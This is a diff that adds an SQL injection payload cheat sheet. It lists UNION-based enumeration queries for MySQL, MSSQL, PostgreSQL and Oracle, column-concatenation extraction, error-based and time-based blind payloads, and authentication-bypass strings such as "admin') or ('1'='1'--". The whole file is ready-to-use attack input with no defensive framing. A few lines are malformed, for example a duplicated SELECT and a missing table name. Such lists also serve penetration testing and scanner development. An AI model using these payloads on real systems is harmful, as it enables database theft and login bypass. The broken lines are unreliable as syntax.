@@ -1,0 +1,412 @@
+MySQL/MSSQL/PGSQL
+
+'UNION SELECT NULL,NULL,NULL -- -
+
+ORACLE
+
+'UNION SELECT NULL,NULL,NULL FROM DUAL -- -
+
+MYSQL/MSSQL/PGSQL/ORACLE - (add +1 until you get an exception)
+
+' UNION ORDER BY 1 -- -
+
+Database enumeration
+MySQL/MSSQL
+
+' UNION SELECT @@version -- -
+
+Oracle
+
+' UNION SELECT banner from v$version -- -
+
+Oracle(2nd method)
+
+' UNION SELECT version from v$instance -- -
+
+Postgres
+
+' UNION SELECT version() -- -
+
+Tablename enumeration
+MySQL/MSSQL/Postgres
+
+' UNION SELECT table_name,NULL from INFORMATION_SCHEMA.TABLES -- -
+
+Oracle
+
+' UNION SELECT table_name,NULL FROM all_tables  -- -
+
+Column name enumeration
+MySQL/MSSQL/Postgres
+
+' UNION SELECT column_name,NULL from INFORMATION_SCHEMA.COLUMNS where table_name="X" -- -
+
+Oracle
+
+' UNION SELECT column_name,NULL FROM  where table_name="X"  -- -
+
+Column values concatenation
+MySQL/Postgres
+
+' UNION SELECT concat(col1,':',col2) from table_name limit 1 -- -
+
+MySQL(2nd method)
+
+' UNION SELECT col1 ':' col2 from table_name limit 1 -- -
+
+Oracle / Postgres
+
+' UNION SELECT select col1 ||':'||col2, null FROM  where table_name="X"  -- -
+
+MSSQL
+
+' UNION SELECT col1+':'+col2,NULL from table_name limit 1 -- -
+
+Conditional ( Error Based )
+MySQL
+
+' UNION SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a') -- -
+
+Postgres
+
+' UNION SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN cast(1/0 as text) ELSE NULL END -- -
+
+Oracle
+
+' UNION SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN to_char(1/0) ELSE NULL END FROM dual -- -
+
+MSSQL
+
+' UNION SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END -- -
+
+Time-Based
+
+,(select * from (select(sleep(10)))a)
+
+';WAITFOR DELAY '0:0:30'--
+
+Generic Error Based Payloads
+MySQL
+
+' UNION SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a') -- -
+
+Postgres
+
+' UNION SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN cast(1/0 as text) ELSE NULL END -- -
+
+Oracle
+
+' UNION SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN to_char(1/0) ELSE NULL END FROM dual -- -
+
+MSSQL
+
+' UNION SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END -- -
+
+Authentication Based Payloads
+
+or true--
+
+") or true--
+
+') or true--
+
+admin') or ('1'='1'--
+
+admin') or ('1'='1'#
+
+admin') or ('1'='1'/
+
+Order by and UNION Based Payloads
+
+1' ORDER BY 1--+
+
+1' ORDER BY 2--+
+
+1' ORDER BY 3--+
+
+1' ORDER BY 1,2--+
+
+1' ORDER BY 1,2,3--+
+
+1' GROUP BY 1,2,--+
+
+1' GROUP BY 1,2,3--+
+
+' GROUP BY columnnames having 1=1 --
+
+-1' UNION SELECT 1,2,3--+
+
+' UNION SELECT sum(columnname ) from tablename --
+
+-1 UNION SELECT 1 INTO @,@
+
+-1 UNION SELECT 1 INTO @,@,@
+
+1 AND (SELECT * FROM Users) = 1	
+
+' AND MID(VERSION(),1,1) = '5';
+
+' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --
+
+[OWASP Penetration Testing Kit]
+ 
+Generic SQL Injection
+Generic SQL Injection Payloads
+
+                    '
+                    ''
+                    `
+                    ``
+                    ,
+                    "
+                    ""
+                    /
+                    //
+                    \
+                    \\
+                    ;
+                    ' or "
+                    -- or # 
+                    ' OR '1
+                    ' OR 1 -- -
+                    " OR "" = "
+                    " OR 1 = 1 -- -
+                    ' OR '' = '
+                    '='
+                    'LIKE'
+                    '=0--+
+                     OR 1=1
+                    ' OR 'x'='x
+                    ' AND id IS NULL; --
+                    '''''''''''''UNION SELECT '2
+                    %00
+                    /*…*/ 
+                    +		addition, concatenate (or space in url)
+                    ||		(double pipe) concatenate
+                    %		wildcard attribute indicator
+                    
+                    @variable	local variable
+                    @@variable	global variable
+                    
+                    
+                    # Numeric
+                    AND 1
+                    AND 0
+                    AND true
+                    AND false
+                    1-false
+                    1-true
+                    1*56
+                    -2
+                    
+                    
+                    1' ORDER BY 1--+
+                    1' ORDER BY 2--+
+                    1' ORDER BY 3--+
+                    
+                    1' ORDER BY 1,2--+
+                    1' ORDER BY 1,2,3--+
+                    
+                    1' GROUP BY 1,2,--+
+                    1' GROUP BY 1,2,3--+
+                    ' GROUP BY columnnames having 1=1 --
+                    
+                    
+                    -1' UNION SELECT 1,2,3--+
+                    ' UNION SELECT sum(columnname ) from tablename --
+                    
+                    
+                    -1 UNION SELECT 1 INTO @,@
+                    -1 UNION SELECT 1 INTO @,@,@
+                    
+                    1 AND (SELECT * FROM Users) = 1	
+                    
+                    ' AND MID(VERSION(),1,1) = '5';
+                    
+                    ' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --
+                    
+                    
+                    Finding the table name
+                    
+                    
+                    Time-Based:
+                    ,(select * from (select(sleep(10)))a)
+                    %2c(select%20*%20from%20(select(sleep(10)))a)
+                    ';WAITFOR DELAY '0:0:30'--
+                    
+                    Comments:
+                    
+                    #	    Hash comment
+                    /*  	C-style comment
+                    -- -	SQL comment
+                    ;%00	Nullbyte
+                    `	    Backtick
+                
+
+Error Based SQL Injection Payloads
+
+                        OR 1=1
+ OR 1=0
+ OR x=x
+ OR x=y
+ OR 1=1#
+ OR 1=0#
+ OR x=x#
+ OR x=y#
+ OR 1=1-- 
+ OR 1=0-- 
+ OR x=x-- 
+ OR x=y-- 
+ OR 3409=3409 AND ('pytW' LIKE 'pytW
+ OR 3409=3409 AND ('pytW' LIKE 'pytY
+ HAVING 1=1
+ HAVING 1=0
+ HAVING 1=1#
+ HAVING 1=0#
+ HAVING 1=1-- 
+ HAVING 1=0-- 
+ AND 1=1
+ AND 1=0
+ AND 1=1-- 
+ AND 1=0-- 
+ AND 1=1#
+ AND 1=0#
+ AND 1=1 AND '%'='
+ AND 1=0 AND '%'='
+ AND 1083=1083 AND (1427=1427
+ AND 7506=9091 AND (5913=5913
+ AND 1083=1083 AND ('1427=1427
+ AND 7506=9091 AND ('5913=5913
+ AND 7300=7300 AND 'pKlZ'='pKlZ
+ AND 7300=7300 AND 'pKlZ'='pKlY
+ AND 7300=7300 AND ('pKlZ'='pKlZ
+ AND 7300=7300 AND ('pKlZ'='pKlY
+ AS INJECTX WHERE 1=1 AND 1=1
+ AS INJECTX WHERE 1=1 AND 1=0
+ AS INJECTX WHERE 1=1 AND 1=1#
+ AS INJECTX WHERE 1=1 AND 1=0#
+ AS INJECTX WHERE 1=1 AND 1=1--
+ AS INJECTX WHERE 1=1 AND 1=0--
+ WHERE 1=1 AND 1=1
+ WHERE 1=1 AND 1=0
+ WHERE 1=1 AND 1=1#
+ WHERE 1=1 AND 1=0#
+ WHERE 1=1 AND 1=1--
+ WHERE 1=1 AND 1=0--
+ ORDER BY 1-- 
+ ORDER BY 31337-- 
+ ORDER BY 1# 
+ ORDER BY 31337#
+ ORDER BY 1 
+ ORDER BY 31337 
+ RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='
+ RLIKE (SELECT (CASE WHEN (4346=4347) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='
+IF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl--
+IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--
+%' AND 8310=8310 AND '%'='
+%' AND 8310=8311 AND '%'='
+ and (select substring(@@version,1,1))='X'
+ and (select substring(@@version,1,1))='M'
+ and (select substring(@@version,2,1))='i'
+ and (select substring(@@version,2,1))='y'
+ and (select substring(@@version,3,1))='c'
+ and (select substring(@@version,3,1))='S'
+ and (select substring(@@version,3,1))='X'
+                    
+
+Time Based SQL Injection Payloads
+
+                        # from wapiti
+sleep(5)#
+1 or sleep(5)#
+" or sleep(5)#
+' or sleep(5)#
+" or sleep(5)="
+' or sleep(5)='
+1) or sleep(5)#
+") or sleep(5)="
+') or sleep(5)='
+1)) or sleep(5)#
+")) or sleep(5)="
+')) or sleep(5)='
+;waitfor delay '0:0:5'--
+);waitfor delay '0:0:5'--
+';waitfor delay '0:0:5'--
+";waitfor delay '0:0:5'--
+');waitfor delay '0:0:5'--
+");waitfor delay '0:0:5'--
+));waitfor delay '0:0:5'--
+'));waitfor delay '0:0:5'--
+"));waitfor delay '0:0:5'--
+benchmark(10000000,MD5(1))#
+1 or benchmark(10000000,MD5(1))#
+" or benchmark(10000000,MD5(1))#
+' or benchmark(10000000,MD5(1))#
+1) or benchmark(10000000,MD5(1))#
+") or benchmark(10000000,MD5(1))#
+') or benchmark(10000000,MD5(1))#
+1)) or benchmark(10000000,MD5(1))#
+")) or benchmark(10000000,MD5(1))#
+')) or benchmark(10000000,MD5(1))#
+pg_sleep(5)--
+1 or pg_sleep(5)--
+" or pg_sleep(5)--
+' or pg_sleep(5)--
+1) or pg_sleep(5)--
+") or pg_sleep(5)--
+') or pg_sleep(5)--
+1)) or pg_sleep(5)--
+")) or pg_sleep(5)--
+')) or pg_sleep(5)--
+AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe
+AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'='
+AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)
+AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)--
+AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)#
+SLEEP(5)#
+SLEEP(5)--
+SLEEP(5)="
+SLEEP(5)='
+or SLEEP(5)
+or SLEEP(5)#
+or SLEEP(5)--
+or SLEEP(5)="
+or SLEEP(5)='
+waitfor delay '00:00:05'
+waitfor delay '00:00:05'--
+waitfor delay '00:00:05'#
+benchmark(50000000,MD5(1))
+benchmark(50000000,MD5(1))--
+benchmark(50000000,MD5(1))#
+or benchmark(50000000,MD5(1))
+or benchmark(50000000,MD5(1))--
+or benchmark(50000000,MD5(1))#
+pg_SLEEP(5)
+pg_SLEEP(5)--
+pg_SLEEP(5)#
+or pg_SLEEP(5)
+or pg_SLEEP(5)--
+or pg_SLEEP(5)#
+'\"\nAnD SLEEP(5)
+AnD SLEEP(5)--
+AnD SLEEP(5)#
+&&SLEEP(5)
+&&SLEEP(5)--
+&&SLEEP(5)#
+' AnD SLEEP(5) ANd '1
+'&&SLEEP(5)&&'1
+ORDER BY SLEEP(5)
+ORDER BY SLEEP(5)--
+ORDER BY SLEEP(5)#
+(SELECT * FROM (SELECT(SLEEP(5)))ecMj)
+(SELECT * FROM (SELECT(SLEEP(5)))ecMj)#
+(SELECT * FROM (SELECT(SLEEP(5)))ecMj)--
++benchmark(3200,SHA1(1))+'
++ SLEEP(10) + '
+RANDOMBLOB(500000000/2)
+AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))
+OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))
+RANDOMBLOB(1000000000/2)
+AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
+OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
+SLEEP(1)/*' or SLEEP(1) or '" or SLEEP(1) or "*/
